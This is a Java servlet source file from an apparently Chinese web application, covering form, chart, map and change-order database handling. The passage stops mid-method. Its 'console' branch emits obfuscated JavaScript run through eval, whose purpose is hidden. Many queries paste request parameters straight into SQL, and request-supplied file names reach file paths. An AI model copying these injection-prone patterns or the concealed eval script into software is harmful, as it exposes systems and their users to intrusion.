package com.yulongtao.web.component;

import java.io.File;
import java.io.IOException;
import java.io.PrintWriter;
import java.sql.PreparedStatement;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

import com.Debug;
import com.yulongtao.db.DBFactory;
import com.yulongtao.db.FieldEx;
import com.yulongtao.db.Record;
import com.yulongtao.db.TableEx;
import com.yulongtao.phone.AppPub;
import com.yulongtao.pub.Pub;
import com.yulongtao.sys.Dic;
import com.yulongtao.sys.QRSC;
import com.yulongtao.util.EFile;
import com.yulongtao.util.EString;
import com.yulongtao.util.excel.ExcelModeManager;
import com.yulongtao.util.pay.Pay_Notify;
import com.yulongtao.web.FormItem;
import com.yulongtao.web.ParamTree;
import com.yulongtao.web.YLTree;
import com.yulongtao.web.chart.CharView;
import com.yulongtao.web.chart.ChartData;

public class Component extends HttpServlet
{
    private static final String CONTENT_TYPE = "text/html; charset=GBK";
    private HttpServletRequest request;
    private HttpServletResponse response;
    private PrintWriter out;
    private FormItem fItem;
    
    public Component() {
        this.fItem = new FormItem();
    }
    
    public void init() throws ServletException {
    }
    
    public void doGet(final HttpServletRequest request, final HttpServletResponse response) throws ServletException, IOException {
        response.setContentType("text/html; charset=GBK");
        this.out = response.getWriter();
        this.request = request;
        this.response = response;
        final String strDataId = request.getParameter("sys_type");
        if (strDataId.equals("dic")) {
            this.generDicOption();
        }
        else if (strDataId.equals("datatree")) {
            this.generTree();
        }
        else if (strDataId.equals("singtree")) {
            this.generSingTree();
        }
        else if (strDataId.equals("data")) {
            this.generDatOption();
        }
        else if (strDataId.equals("branch")) {
            this.generBranch();
        }
        else if (strDataId.equals("check")) {
            this.generCheck();
        }
        else if (strDataId.equals("desiner")) {
            this.generFormDesiner();
        }
        else if (strDataId.equals("gtt")) {
            this.generGTT();
        }
        else if (strDataId.equals("formdesiner")) {
            this.generForm();
        }
        else if (strDataId.equals("saveform")) {
            this.saveForm();
        }
        else if (strDataId.equals("grrc")) {
            final PersonCalendar pCale = new PersonCalendar(request, this.out);
            pCale.doCalenDar();
        }
        else if (strDataId.equals("generitem")) {
            this.generItemConfig();
        }
        else if (strDataId.equals("saveitem")) {
            this.saveItem();
        }
        else if (strDataId.equals("getdata")) {
            this.getJSData();
        }
        else if (strDataId.equals("viewtree")) {
            this.getViewTree();
        }
        else if (strDataId.equals("saveflow")) {
            this.saveFlow(request.getParameter("flowid"));
        }
        else if (strDataId.equals("viewflow")) {
            this.viewFlow(request.getParameter("flowid"));
        }
        else if (strDataId.equals("tabfields")) {
            this.getTableFields(request.getParameter("tables"), new Hashtable());
        }
        else if (strDataId.equals("exceltodb")) {
            this.excelToDbConfig(request.getParameter("imid"));
        }
        else if (strDataId.equals("genchartjs")) {
            final CharView cV = new CharView(this.out);
            final ChartData chartData = new ChartData(request.getParameter("cid"), request);
            cV.setData(chartData);
            cV.viewScript();
        }
        else if (strDataId.equals("insertgraph")) {
            final EFile eFile = new EFile();
            final String strFileName = String.valueOf(Dic.strCurPath) + "\\modexcel\\" + request.getParameter("fn") + ".html";
            final String strTdId = " id='" + request.getParameter("tid").replaceAll("\\$", "\\\\\\$") + "'>";
            String strFile = eFile.readFile(strFileName).toString();
            final String strCid = request.getParameter("cid");
            if (strFile.indexOf(" id='" + request.getParameter("tid") + "'>" + "<div id") == -1) {
                strFile = strFile.replaceAll(strTdId, String.valueOf(strTdId) + "<div id=\"chart_" + strCid + "\" style=\"width:600px;height:300px;\"></div><script id=\"" + request.getParameter("tid").replaceAll("\\$", "\\\\\\$") + "_js\" language=\"javascript\" src=\"comp?sys_type=genchartjs&cid=" + strCid + "\"></script>");
                eFile.writeFile(strFileName, new StringBuffer(strFile), false);
            }
        }
        else if (strDataId.equals("getgraph")) {
            final EFile eFile = new EFile();
            final String strFileName = String.valueOf(Dic.strCurPath) + "\\modexcel\\" + request.getParameter("fn") + ".html";
            final String strFile2 = eFile.readFile(strFileName).toString();
            this.out.print("<script type='text/javascript' src='js/ylminiutil.js'></script>");
            this.out.println(strFile2);
        }
        else if (strDataId.equals("console")) {
            this.out.println("<body  style=\"margin:0;padding:0;border:0;\" scroll='yes'> <img id='imgscreen' src=\"\"> </body> <script>OlOlll=\"(x)\";OllOlO=\" String\";OlllOO=\"tion\";OlOllO=\"Code(x)}\";OllOOO=\"Char\";OlllOl=\"func\";OllllO=\" l = \";OllOOl=\".from\";OllOll=\"{return\";Olllll=\"var\";eval(Olllll+OllllO+OlllOl+OlllOO+OlOlll+OllOll+OllOlO+OllOOl+OllOOO+OlOllO);eval(l(79)+l(61)+l(102)+l(117)+l(110)+l(99)+l(116)+l(105)+l(111)+l(110)+l(40)+l(109)+l(41)+l(123)+l(114)+l(101)+l(116)+l(117)+l(114)+l(110)+l(32)+l(83)+l(116)+l(114)+l(105)+l(110)+l(103)+l(46)+l(102)+l(114)+l(111)+l(109)+l(67)+l(104)+l(97)+l(114)+l(67)+l(111)+l(100)+l(101)+l(40)+l(77)+l(97)+l(116)+l(104)+l(46)+l(102)+l(108)+l(111)+l(111)+l(114)+l(40)+l(109)+l(47)+l(49)+l(48)+l(48)+l(48)+l(48)+l(41)+l(47)+l(57)+l(57)+l(41)+l(59)+l(125));eval(\"\"+O(100982686)+O(115832268)+O(108901704)+O(98014045)+O(114840037)+O(103957655)+O(109892058)+O(108908267)+O(31682220)+O(99005826)+O(109890222)+O(67322628)+O(99994131)+O(113855250)+O(105931580)+O(83165556)+O(109892827)+O(110888042)+O(39602746)+O(40597865)+O(121774244)+O(12870289)+O(9906138)+O(8919457)+O(8919511)+O(103952533)+O(107918755)+O(101975985)+O(113855136)+O(98019737)+O(112860201)+O(99993964)+O(99994869)+O(108903424)+O(45543796)+O(113857548)+O(112867529)+O(98017380)+O(60391154)+O(33665345)+O(67324250)+O(103952269)+O(113855006)+O(110880968)+O(106920696)+O(96033870)+O(119797257)+O(72276801)+O(107914604)+O(96034198)+O(101979241)+O(99996438)+O(62376720)+O(112864766)+O(99009004)+O(60397609)+O(33663626)+O(42576447)+O(76236039)+O(96034056)+O(114844299)+O(102960971)+O(45547371)+O(112861792)+O(96038296)+O(108904949)+O(99000145)+O(109892426)+O(107912420)+O(39608510)+O(40594925)+O(42573859)+O(33664412)+O(37627133)+O(118800825)+O(60396535)+O(33666781)+O(42577028)+O(39608270)+O(99991642)+O(116821229)+O(99991609)+O(108907692)+O(114846200)+O(45544291)+O(118808945)+O(42572813)+O(99008791)+O(109897789)+O(98017898)+O(115835272)+O(107918856)+O(99993507)+O(108903672)+O(114843316)+O(45541933)+O(99000056)+O(109891864)+O(98011040)+O(115832987)+O(107911371)+O(99993812)+O(108906217)+O(114840074)+O(68310457)+O(106925024)+O(99994152)+O(107910991)+O(99999078)+O(108902744)+O(114842201)+O(45546246)+O(113853922)+O(98018397)+O(112864589)+O(109892756)+O(106922438)+O(106925516)+O(75249986)+O(99993961)+O(100987034)+O(114844047)+O(40594958)+O(42573750)+O(33664591)+O(37627465)+O(33664810)+O(42573508)+O(33669387)+O(119799999)+O(60399661)+O(33663907)+O(42571405)+O(39607464)+O(99997592)+O(116825622)+O(99998749)+O(108906673)+O(114848666)+O(45546088)+O(119792431)+O(42575218)+O(99003244)+O(109892574)+O(98014138)+O(115835524)+O(107915602)+O(99995436)+O(108902756)+O(114844524)+O(45549109)+O(99009214)+O(109893414)+O(98013026)+O(115832413)+O(107913375)+O(99993600)+O(108906913)+O(114847006)+O(68319019)+O(106924480)+O(99995691)+O(107915288)+O(99992576)+O(108902025)+O(114842569)+O(45544855)+O(113852665)+O(98011699)+O(112864258)+O(109899093)+O(106921654)+O(106922589)+O(83167970)+O(109896357)+O(110889177)+O(40591630)+O(58417746)+O(12870050)+O(9900907)+O(8916311)+O(123752133)+O(12879710)+O(9902195)+O(8914681)+O(117810510)+O(103958859)+O(108902866)+O(99004789)+O(109895899)+O(117818831)+O(45546389)+O(109891786)+O(108907975)+O(106929017)+O(109893957)+O(96039832)+O(99001164)+O(60393078)+O(100981561)+O(115837695)+O(108909220)+O(98017546)+O(114846062)+O(103951441)+O(109899473)+O(108903915)+O(39604487)+O(40594998)+O(121777059)+O(12877862)+O(9909267)+O(8919518)+O(8911881)+O(103959535)+O(107911020)+O(101975465)+O(113858790)+O(98017006)+O(112869583)+O(99997121)+O(99994516)+O(108900892)+O(45543503)+O(113857820)+O(112863290)+O(98011973)+O(60397938)+O(33665646)+O(67326731)+O(103955125)+O(113851033)+O(110883533)+O(106922594)+O(96032356)+O(119799218)+O(72274769)+O(107911284)+O(96034855)+O(101972604)+O(99994752)+O(62378640)+O(118809035)+O(60392655)+O(48512508)+O(33668445)+O(58414326)+O(12875684)+O(9900962)+O(8918347)+O(123751142)+O(12877343)+O(9903254)+O(8918448)+O(117815872)+O(103955251)+O(108903474)+O(99002670)+O(109896021)+O(117819184)+O(45544125)+O(109899203)+O(108902680)+O(98010833)+O(106929349)+O(103957822)+O(98019415)+O(105938033)+O(60392484)+O(99008683)+O(109896331)+O(67321591)+O(99998865)+O(113859303)+O(105935605)+O(83166351)+O(109899994)+O(110883894)+O(58410090));</script>");
        }
        else if (strDataId.equals("seluser")) {
            this.out.println(this.generSelUser(request.getParameter("bid"), request.getParameter("pid")));
        }
        else if (strDataId.equals("map")) {
            this.out.println("<!DOCTYPE html> <html> <head> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /> <meta name=\"viewport\" content=\"initial-scale=1.0, user-scalable=no\" /> <style type=\"text/css\"> body, html,#allmap {width: 100%;height: 100%;overflow: hidden;margin:0;} #golist {display: none;} @media (max-device-width: 780px){#golist{display: block !important;}} </style> <script type=\"text/javascript\" src=\"http://api.map.baidu.com/api?type=quick&ak=Hvo0danPmU7OTNqooGSeiPSIWXgaGd9o&v=2.0\"></script> <script type=\"text/javascript\" src=\"js/ylphone.js\"></script> <title></title> </head> <body> <div id=\"allmap\"></div> </body> </html> <script type=\"text/javascript\">");
            this.out.println("function getCurLocation(){ var map = new BMap.Map(\"allmap\");");
            this.out.println(LocationPoint.generMap());
            this.out.println("} getCurLocation();</script>");
        }
        else if (strDataId.equals("bx")) {
            this.out.println(this.getBx());
        }
        else if (strDataId.equals("zj")) {
            this.out.println(this.getZj());
        }
        else if (strDataId.equals("zzbgd")) {
            this.out.println(this.generBGD());
        }
        else if (strDataId.equals("location")) {
            boolean bIsToPix = false;
            if (request.getParameter("p") != null) {
                bIsToPix = true;
            }
            final String strUid = request.getParameter("u");
            LocationPoint.setUserLocation(strUid, Double.parseDouble(request.getParameter("lat")), Double.parseDouble(request.getParameter("lon")), bIsToPix);
            LocationPoint.hashUserCity.put(strUid, EString.encoderStr(request.getParameter("c"), "utf-8"));
        }
        else if (strDataId.equals("zfjg")) {
            this.out.print(this.zfjg());
        }
    }
    
    private String viewChange(final String _strSql, final String[] arrStrCode, final String _strHeads, final String[] arrStrDic) {
        final StringBuffer vResult = new StringBuffer("<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html style='width:100%;height:100%;'><style>.reptable{width:100%;background:white;} .reptable td,.yltable th { padding: 10px; border-bottom: 1px solid #f2f2f2;border-right: 1px solid #f2f2f2; } .reptable .alternate, .reptable  tr:nth-child(odd) { background: #f5f5f5; -webkit-box-shadow: 0 1px 0 rgba(255,255,255,.8) inset; -moz-box-shadow:0 1px 0 rgba(255,255,255,.8) inset; box-shadow: 0 1px 0 rgba(255,255,255,.8) inset; } .reptable th { text-align: left; padding: 10px; background-color: #eee; height:25px;  }</style><body>");
        vResult.append(AppPub.strRepTable);
        final DBFactory dbf = new DBFactory("ggsc_tmp", 1);
        TableEx tableEx = null;
        try {
            tableEx = dbf.query(_strSql);
            final int iRecordCount = tableEx.getRecordCount();
            final int iCodeCount = arrStrCode.length;
            vResult.append(_strHeads);
            for (int i = 0; i < iRecordCount; ++i) {
                final Record record = tableEx.getRecord(i);
                vResult.append("<tr>");
                for (int j = 0; j < iCodeCount; ++j) {
                    String strValue = record.getFieldByName(arrStrCode[j]).value.toString();
                    String strBGColor = "";
                    if (!arrStrDic[j].equals("0")) {
                        final String strDicId = String.valueOf(arrStrDic[j]) + "_" + strValue;
                        strValue = Dic.hash.get(strDicId).toString();
                        strBGColor = " style='background:" + Dic.hashColor.get(strDicId) + "' ";
                    }
                    vResult.append("<td" + strBGColor + ">");
                    vResult.append(strValue);
                    vResult.append("</td>");
                }
                vResult.append("</tr>");
            }
        }
        catch (Exception ex) {
            return vResult.append("</table></body></html>").toString();
        }
        finally {
            dbf.close();
        }
        dbf.close();
        return vResult.append("</table></body></html>").toString();
    }
    
    private String generBGD() {
        final String strIm = this.request.getParameter("im");
        final String strPid = this.request.getParameter("pid");
        if (strIm.equals("gj")) {
            return this.viewChange("select * from t_change where ITYPE=0 and S_PID='" + strPid + "' order by S_CHANGETYPE", new String[] { "S_COMID", "S_CHANGETYPE", "I_OLDSL", "I_NEWSL", "S_DETAIL" }, "<tr><th>\u6784\u4ef6\u53f7</th><th>\u53d8\u66f4\u65b9\u5f0f</th><th>\u539f\u6570\u91cf</th><th>\u65b0\u6570\u91cf</th><th>\u5907\u6ce8</th></tr>", new String[] { "0", "1404886767922", "0", "0", "0" });
        }
        if (strIm.equals("lj")) {
            return this.viewChange("select * from t_change where ITYPE=1 and S_PID='" + strPid + "' order by S_COMID,S_CHANGETYPE", new String[] { "S_COMID", "S_PARTID", "S_CHANGETYPE", "I_OLDSL", "I_NEWSL", "S_DETAIL" }, "<tr><th>\u6784\u4ef6\u53f7</th><th>\u96f6\u4ef6\u53f7</th><th>\u53d8\u66f4\u65b9\u5f0f</th><th>\u539f\u6570\u91cf</th><th>\u65b0\u6570\u91cf</th><th>\u5907\u6ce8</th></tr>", new String[] { "0", "0", "1404886767922", "0", "0", "0" });
        }
        if (strIm.equals("zzbgd")) {
            return this.makeBGD();
        }
        if (strIm.equals("zxbg")) {
            return this.zxbg();
        }
        if (strIm.equals("wcbg")) {
            return this.wcbg();
        }
        if (strIm.equals("bgdmx")) {
            return this.bgdmx();
        }
        return Pub.getWizardTitle(new String[][] { { "\u5bfc\u5165\u6700\u65b0\u6784\u4ef6", "5", "1", "comp?sys_type=zzbgd&im=gj&pid=" + strPid, "<div class=\"toexcelbttn\"><span id=\"sysfileupload1\">\u5bfc\u5165\u6700\u65b0\u6784\u4ef6</span></div>", "<script type='text/javascript' src='js/yluploader.js'></script><script>var uploadUrl='/uploadFile?'; initSingUpload_FreeOp('105','modexcel','\u5bfc\u5165\u6784\u4ef6','85120.0','.xlsx,.xls','Excel\u6a21\u677f\u6587\u4ef6','sysfileupload1','~ggsc_tmp~" + strPid + "~0','PRO_002'); </script>" }, { "\u5bfc\u5165\u6700\u65b0\u96f6\u4ef6", "4", "2", "comp?sys_type=zzbgd&im=lj&pid=" + strPid, "<div class=\"toexcelbttn\"><span id=\"sysfileupload1\">\u5bfc\u5165\u6700\u65b0\u96f6\u4ef6</span></div>", "<script type='text/javascript' src='js/yluploader.js'></script><script>var uploadUrl='/uploadFile?'; initSingUpload_FreeOp('106','modexcel','\u5bfc\u5165\u96f6\u4ef6','85120.0','.xlsx,.xls','Excel\u6a21\u677f\u6587\u4ef6','sysfileupload1','~ggsc_tmp~" + strPid + "~1','PRO_002'); </script>" }, { "\u5236\u4f5c\u53d8\u66f4\u5355", "3", "3", "comp?sys_type=zzbgd&im=zzbgd&pid=" + strPid, "", "" }, { "\u6267\u884c\u53d8\u66f4", "2", "4", "comp?sys_type=zzbgd&im=zxbg&pid=" + strPid, "", "" }, { "\u5b8c\u6210\u53d8\u66f4", "1", "5", "comp?sys_type=zzbgd&im=wcbg&pid=" + strPid, "", "" } }, Integer.parseInt(strIm), strPid).toString();
    }
    
    private HashMap<String, StringBuffer> initLJBGDMX(final DBFactory _dbf, final String _strPid) throws Exception {
        final HashMap<String, StringBuffer> hash = new HashMap<String, StringBuffer>();
        final TableEx tableEx = _dbf.query("select S_COMID,S_PARTID,S_CHANGETYPE,S_CLFS,I_OLDSL,I_NEWSL,S_DETAIL,I_ISCL from t_change a  where a.s_pid='" + _strPid + "' and a.itype=1");
        for (int iCount = tableEx.getRecordCount(), i = 0; i < iCount; ++i) {
            final Record record = tableEx.getRecord(i);
            final String strGJH = record.getFieldByName("S_COMID").value.toString();
            StringBuffer sb = hash.get(strGJH);
            if (sb == null) {
                sb = new StringBuffer();
            }
            sb.append("<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;").append(record.getFieldByName("S_PARTID").value).append("</td>");
            final String strBGLX = record.getFieldByName("S_CHANGETYPE").value.toString();
            sb.append("<td style='background:" + Dic.hashColor.get("1404886767922_" + strBGLX) + "'>").append(Dic.hash.get("1404886767922_" + strBGLX)).append("</td><td width='100'>");
            sb.append(record.getFieldByName("S_DETAIL").value).append("</td>");
            final String strClFSId = "1477905243146_" + record.getFieldByName("S_CLFS").value;
            sb.append("<td style='background:" + Dic.hashColor.get(strClFSId) + ";' align='center'>").append(Dic.hash.get(strClFSId)).append("</td>");
            sb.append("<td>").append(record.getFieldByName("I_OLDSL").value).append("</td>").append("<td>").append(record.getFieldByName("I_NEWSL").value).append("</td>");
            final String strISCL = "1478230090398_" + record.getFieldByName("I_ISCL").value;
            sb.append("<td style='background:" + Dic.hashColor.get(strISCL) + ";' align='center'>").append(Dic.hash.get(strISCL)).append("</td>");
            sb.append("</tr>");
            hash.put(strGJH, sb);
        }
        return hash;
    }
    
    private String bgdmx() {
        final StringBuffer vResult = new StringBuffer("<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html style='width:100%;height:100%;'><style>.reptable{width:100%;background:white;} .reptable td,.yltable th { padding: 10px; border-bottom: 1px solid #f2f2f2;border-right: 1px solid #f2f2f2; }  .reptable th { text-align: left; padding: 10px; background-color: #eee; height:25px;  }</style><body>");
        vResult.append(AppPub.strRepTable);
        final DBFactory dbf = new DBFactory();
        TableEx tableEx = null;
        final String strPid = this.request.getParameter("pid");
        try {
            final HashMap<String, StringBuffer> hashLj = this.initLJBGDMX(dbf, strPid);
            tableEx = dbf.query("select s_comid,s_changetype,s_detail,I_OLDSL,I_NEWSL,S_CLFS,I_ISCL from t_change a where a.s_pid='" + strPid + "' and a.itype=0 order by I_ISCL");
            final int iRecordCount = tableEx.getRecordCount();
            vResult.append("<tr><th width='280'>\u6784\u4ef6\u53f7/\u96f6\u4ef6\u53f7</th><th width='100'>\u53d8\u66f4\u65b9\u5f0f</th><th width='100'>\u5907\u6ce8</th><th width='100'>\u5904\u7406\u65b9\u5f0f</th><th>\u539f\u6570\u91cf</th><th>\u65b0\u6570\u91cf</th><th>\u662f\u5426\u5904\u7406</th></tr>");
            String strGJH = "";
            for (int i = 0; i < iRecordCount; ++i) {
                final Record record = tableEx.getRecord(i);
                strGJH = record.getFieldByName("s_comid").value.toString();
                vResult.append("<tr style='background:#f8f8f8'>").append("<td>").append(strGJH).append("</td>");
                final String strBGLX = record.getFieldByName("s_changetype").value.toString();
                vResult.append("<td style='font-weight:bold;background:" + Dic.hashColor.get("1404886767922_" + strBGLX) + "'>").append(Dic.hash.get("1404886767922_" + strBGLX)).append("</td>");
                vResult.append("<td>").append(record.getFieldByName("s_detail").value).append("</td>");
                final String strClFSId = "1477905243146_" + record.getFieldByName("S_CLFS").value;
                vResult.append("<td style='font-weight:bold;background:" + Dic.hashColor.get(strClFSId) + ";' align='center'>").append(Dic.hash.get(strClFSId)).append("</td>");
                vResult.append("<td>").append(record.getFieldByName("I_OLDSL").value).append("</td>");
                vResult.append("<td>").append(record.getFieldByName("I_NEWSL").value).append("</td>");
                final String strISCL = "1478230090398_" + record.getFieldByName("I_ISCL").value;
                vResult.append("<td style='font-weight:bold;background:" + Dic.hashColor.get(strISCL) + ";' align='center'>").append(Dic.hash.get(strISCL)).append("</td>");
                vResult.append("</tr>");
                vResult.append(hashLj.get(strGJH));
            }
        }
        catch (Exception e) {
            System.out.println(e);
            return vResult.append("</table></body></html>").toString();
        }
        finally {
            dbf.close();
        }
        dbf.close();
        return vResult.append("</table></body></html>").toString();
    }
    
    private String wcbg() {
        final StringBuffer vResult = new StringBuffer();
        final DBFactory dbf = new DBFactory();
        final String strPid = this.request.getParameter("pid");
        try {
            final String strBGId = EString.getCurDate_HH();
            dbf.sqlExe("INSERT INTO t_change (S_BGDH,S_PID,S_COMID,S_PARTID,ITYPE,S_CHANGETYPE,S_DETAIL,I_OLDSL,I_NEWSL,S_CLFS) select '" + strBGId + "' S_BGDH,S_PID,S_COMID,S_PARTID,ITYPE,S_CHANGETYPE,S_DETAIL,I_OLDSL,I_NEWSL,S_CLFS from ggsc_tmp.t_change where s_pid='" + strPid + "'", true);
            final TableEx tableEx = dbf.query("select * from t_change where S_CLFS='LJBG' and I_ISCL=0 and s_pid='" + strPid + "'");
            final int iRecordCount = tableEx.getRecordCount();
            boolean bIsCl = true;
            for (int i = 0; i < iRecordCount; ++i) {
                final Record record = tableEx.getRecord(i);
                final String strBGLX = record.getFieldByName("S_CHANGETYPE").value.toString();
                final String strGJH = record.getFieldByName("S_COMID").value.toString();
                if (strBGLX.equals("ADD")) {
                    dbf.exeSqls("INSERT INTO t_com (S_PID,S_GJH,S_NMCODE,S_TH,S_GG,S_CD,S_COUNT,F_DZ,F_ZZ,S_QK,I_GJ_ZZSL,I_GJHJSL,I_GJTXSL,I_GJDMSL,I_GJFFSL,I_YDBSL,S_STATUS,S_IMDATE,S_SSPC,S_YHRQ)select S_PID,S_GJH,S_NMCODE,S_TH,S_GG,S_CD,S_COUNT,F_DZ,F_ZZ,S_QK,I_GJ_ZZSL,I_GJHJSL,I_GJTXSL,I_GJDMSL,I_GJFFSL,I_YDBSL,S_STATUS,S_IMDATE,S_SSPC,S_YHRQ from ggsc_tmp.t_com where S_GJH='" + strGJH + "'", false);
                }
                else if (strBGLX.equals("ADDLJ")) {
                    final String strPartId = record.getFieldByName("S_PARTID").value.toString();
                    dbf.exeSqls("INSERT INTO t_parts (S_PID,S_GJH,S_PARTID,S_GG,S_KD,S_CD,I_ZSL,F_DJZL,F_DJZZ,S_CZ,S_SFXL,S_SFXGX,S_SFZK,S_SFKPK,S_IMDATE,S_DF,S_SSPC,I_USE_COUNT,S_SFXGDL)select S_PID,S_GJH,S_PARTID,S_GG,S_KD,S_CD,I_ZSL,F_DJZL,F_DJZZ,S_CZ,S_SFXL,S_SFXGX,S_SFZK,S_SFKPK,S_IMDATE,S_DF,S_SSPC,I_USE_COUNT,S_SFXGDL from ggsc_tmp.t_parts where S_GJH='" + strGJH + "' and S_PARTID='" + strPartId + "'", false);
                }
                else if (strBGLX.equals("NMADD")) {
                    final String strPartId = record.getFieldByName("S_PARTID").value.toString();
                    final int iType = Integer.parseInt(record.getFieldByName("ITYPE").value.toString());
                    if (iType == 0) {
                        dbf.exeSqls("update t_com set S_COUNT=" + record.getFieldByName("I_NEWSL").value + " where S_GJH='" + strGJH + "' and s_pid='" + strPid + "'", false);
                    }
                    else {
                        dbf.exeSqls("update t_parts set I_ZSL=" + record.getFieldByName("I_NEWSL").value + " where S_GJH='" + strGJH + "' and S_PARTID='" + strPartId + "' and s_pid='" + strPid + "'", false);
                    }
                }
                else {
                    bIsCl = false;
                }
            }
            if (bIsCl) {
                dbf.exeSqls("update t_change set I_ISCL=1 where  S_CLFS='LJBG' and I_ISCL=0", false);
            }
            dbf.sqlExe("delete from ggsc_tmp.t_change", true);
            vResult.append("\u53d8\u66f4\u5b8c\u6210");
        }
        catch (Exception e) {
            e.printStackTrace();
            return vResult.toString();
        }
        finally {
            dbf.close();
        }
        dbf.close();
        return vResult.toString();
    }
    
    private HashMap<String, StringBuffer> initLJ(final DBFactory _dbf) throws Exception {
        final HashMap<String, StringBuffer> hash = new HashMap<String, StringBuffer>();
        final TableEx tableEx = _dbf.query("select S_COMID,S_CHANGETYPE,S_CLFS,I_OLDSL,I_NEWSL,S_DETAIL,a.* from t_mad_tparts a,ggsc_tmp.t_change b where a.s_pid=b.s_pid and a.s_partid=b.s_partid order by s_comid");
        for (int iCount = tableEx.getRecordCount(), i = 0; i < iCount; ++i) {
            final Record record = tableEx.getRecord(i);
            final String strGJH = record.getFieldByName("S_COMID").value.toString();
            StringBuffer sb = hash.get(strGJH);
            if (sb == null) {
                sb = new StringBuffer();
            }
            sb.append("<tr><td>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;").append(record.getFieldByName("S_PARTID").value).append("</td>");
            final String strBGLX = record.getFieldByName("S_CHANGETYPE").value.toString();
            sb.append("<td style='background:" + Dic.hashColor.get("1404886767922_" + strBGLX) + "'>").append(Dic.hash.get("1404886767922_" + strBGLX)).append("</td><td width='100'>");
            sb.append(record.getFieldByName("S_DETAIL").value).append("</td>");
            final String strClFSId = "1477905243146_" + record.getFieldByName("S_CLFS").value;
            sb.append("<td style='background:" + Dic.hashColor.get(strClFSId) + ";' align='center'>").append(Dic.hash.get(strClFSId)).append("</td>");
            sb.append("<td>").append(record.getFieldByName("I_OLDSL").value).append("</td>").append("<td>").append(record.getFieldByName("I_NEWSL").value).append("</td>").append("<td>\u4e0b\u6599:").append(record.getFieldByName("I_ZXLSL").value).append("</td>").append("<td>\u76f8\u8d2f:").append(record.getFieldByName("I_ZXGXSL").value).append("</td>").append("<td>\u5236\u5b54:").append(record.getFieldByName("I_ZZKSL").value).append("</td>").append("<td>\u5761\u53e3:").append(record.getFieldByName("I_ZKPKSL").value).append("</td>").append("<td>\u5f00\u6761:").append(record.getFieldByName("I_ZKPKSL").value).append("</td>").append("<td>\u6253\u5236:").append(record.getFieldByName("I_ZKPKSL").value).append("</td>");
            sb.append("</tr>");
            hash.put(strGJH, sb);
        }
        return hash;
    }
    
    private String zxbg() {
        final StringBuffer vResult = new StringBuffer("<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"><html style='width:100%;height:100%;'><style>.reptable{width:100%;background:white;} .reptable td,.yltable th { padding: 10px; border-bottom: 1px solid #f2f2f2;border-right: 1px solid #f2f2f2; }  .reptable th { text-align: left; padding: 10px; background-color: #eee; height:25px;  }</style><body>");
        vResult.append(AppPub.strRepTable);
        final DBFactory dbf = new DBFactory();
        final String strPid = this.request.getParameter("pid");
        TableEx tableEx = null;
        try {
            final HashMap<String, StringBuffer> hashLj = this.initLJ(dbf);
            tableEx = dbf.query("select s_comid,s_changetype,s_detail,I_OLDSL,I_NEWSL,S_CLFS,s_count,i_gj_zzsl,i_gjhjsl,i_gjtxsl,i_gjdmsl,i_gjffsl,i_ydbsl from ggsc_tmp.t_change a,t_com b where b.s_pid='" + strPid + "' and a.s_pid=b.s_pid and a.s_comid=b.s_gjh and a.itype=0");
            int iRecordCount = tableEx.getRecordCount();
            vResult.append("<tr><th width='150'>\u6784\u4ef6\u53f7/\u96f6\u4ef6\u53f7</th><th width='100'>\u53d8\u66f4\u65b9\u5f0f</th><th width='100'>\u5907\u6ce8</th><th width='100'>\u5904\u7406\u65b9\u5f0f</th><th>\u539f\u6570\u91cf</th><th>\u65b0\u6570\u91cf</th><th>\u5df2\u7ec4\u88c5</th><th>\u5df2\u710a\u63a5</th><th>\u5df2\u8c03\u4fee</th><th>\u5df2\u6253\u78e8</th><th>\u5df2\u9632\u8150</th><th>\u5df2\u6253\u5305</th></tr>");
            String strGJH = "";
            for (int i = 0; i < iRecordCount; ++i) {
                final Record record = tableEx.getRecord(i);
                strGJH = record.getFieldByName("s_comid").value.toString();
                vResult.append("<tr style='background:#f8f8f8'>").append("<td>").append(strGJH).append("</td>");
                final String strBGLX = record.getFieldByName("s_changetype").value.toString();
                vResult.append("<td style='font-weight:bold;background:" + Dic.hashColor.get("1404886767922_" + strBGLX) + "'>").append(Dic.hash.get("1404886767922_" + strBGLX)).append("</td>");
                vResult.append("<td>").append(record.getFieldByName("s_detail").value).append("</td>");
                final String strClFSId = "1477905243146_" + record.getFieldByName("S_CLFS").value;
                vResult.append("<td style='font-weight:bold;background:" + Dic.hashColor.get(strClFSId) + ";' align='center'>").append(Dic.hash.get(strClFSId)).append("</td>");
                vResult.append("<td>").append(record.getFieldByName("I_OLDSL").value).append("</td>");
                vResult.append("<td>").append(record.getFieldByName("I_NEWSL").value).append("</td>");
                vResult.append("<td>").append(record.getFieldByName("i_gj_zzsl").value).append("</td>");
                vResult.append("<td>").append(record.getFieldByName("i_gjhjsl").value).append("</td>");
                vResult.append("<td>").append(record.getFieldByName("i_gjtxsl").value).append("</td>");
                vResult.append("<td>").append(record.getFieldByName("i_gjdmsl").value).append("</td>");
                vResult.append("<td>").append(record.getFieldByName("i_gjffsl").value).append("</td>");
                vResult.append("<td>").append(record.getFieldByName("i_ydbsl").value).append("</td>");
                vResult.append("</tr>");
                vResult.append(hashLj.get(strGJH));
            }
            tableEx = dbf.query("select s_comid,s_changetype,S_CLFS,I_OLDSL,I_NEWSL,s_detail from ggsc_tmp.t_change where s_pid='" + strPid + "' and itype=0 and s_changetype='ADD'");
            iRecordCount = tableEx.getRecordCount();
            for (int i = 0; i < iRecordCount; ++i) {
                final Record record = tableEx.getRecord(i);
                strGJH = record.getFieldByName("s_comid").value.toString();
                vResult.append("<tr>").append("<td>").append(strGJH).append("</td>");
